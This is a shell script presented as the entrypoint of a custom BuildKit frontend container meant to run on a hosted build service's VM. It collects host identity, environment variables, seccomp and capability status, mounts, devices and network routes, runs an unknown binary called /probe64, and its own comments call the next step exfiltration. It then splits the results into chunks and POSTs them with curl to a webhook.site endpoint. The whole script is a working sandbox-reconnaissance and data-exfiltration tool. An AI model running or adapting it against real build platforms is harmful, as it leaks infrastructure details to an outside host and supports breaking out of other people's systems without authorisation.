#!/bin/sh
# laneD fe_probe.sh — entrypoint of the custom BuildKit frontend image.
# Runs inside the frontend container on the Railway build VM; exfils via curl.
OUT=/tmp/fe_results.txt
: > "$OUT"
W="https://webhook.site/b6e7624d-0d11-4b13-90a3-740120691ca4"
log() { echo "$@" | tee -a "$OUT"; }

log "###LANED-FE-START### $(date -u) host=$(hostname) uid=$(id -u)"
{
  echo "=== env (relevant) ==="; env | grep -iE 'buildkit|frontend|syntax' | head -20
  echo "=== /proc/self/status ==="; grep -E 'Seccomp|Cap|NoNewPrivs' /proc/self/status
  echo "=== id ==="; id
  echo "=== mounts ==="; cat /proc/self/mountinfo | head -30
  echo "=== dev ==="; ls -la /dev 2>&1 | head -20
  echo "=== net ==="; cat /proc/net/route 2>/dev/null; cat /proc/net/unix 2>/dev/null | head -20
} >> "$OUT" 2>&1

/probe64 >> "$OUT" 2>&1

log "###LANED-FE-END###"
# exfil
split -b 900k "$OUT" /tmp/fechunk_ 2>/dev/null
for f in "$OUT" /tmp/fechunk_*; do
  [ -f "$f" ] && curl -sS -m 25 -X POST "$W" -H "Content-Type: text/plain" --data-binary @"$f" >/dev/null 2>&1 && echo "exfil:$f ok" >> "$OUT"
done
echo "###LANED-FE-EXFIL-DONE###"
exit 1
